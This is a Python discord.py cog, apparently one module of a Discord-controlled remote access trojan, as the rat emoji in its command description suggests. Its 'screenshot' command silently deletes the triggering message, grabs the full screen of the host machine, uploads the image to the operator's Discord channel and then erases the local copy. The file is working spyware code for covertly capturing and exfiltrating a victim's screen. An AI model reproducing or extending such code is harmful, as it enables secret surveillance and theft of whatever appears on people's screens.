import os
import discord
from PIL import ImageGrab
from discord.ext import commands

class screenshot(commands.Cog):
    def __init__(self, client):
        self.client = client
        self.command_info = {
            "screenshot": "🐀 takes a screenshot"
        }
        
        self.category = "image"
    @commands.command()
    async def screenshot(self, ctx):
        screenshot_dir = 'temp'
        screenshot_path = os.path.join(screenshot_dir, 'tempscreenshot.jpg')

        if not os.path.exists(screenshot_dir):
            os.makedirs(screenshot_dir)

        try:
            await ctx.message.delete()
            
            screenshot = ImageGrab.grab()
            screenshot.save(screenshot_path)
            
            await ctx.send(file=discord.File(screenshot_path))
        
        except Exception as e:
            await ctx.send("An error occurred while taking the screenshot.")
            print(f"Error: {e}")
        
        finally:
            if os.path.exists(screenshot_path):
                os.remove(screenshot_path)

async def setup(client):
    await client.add_cog(screenshot(client))

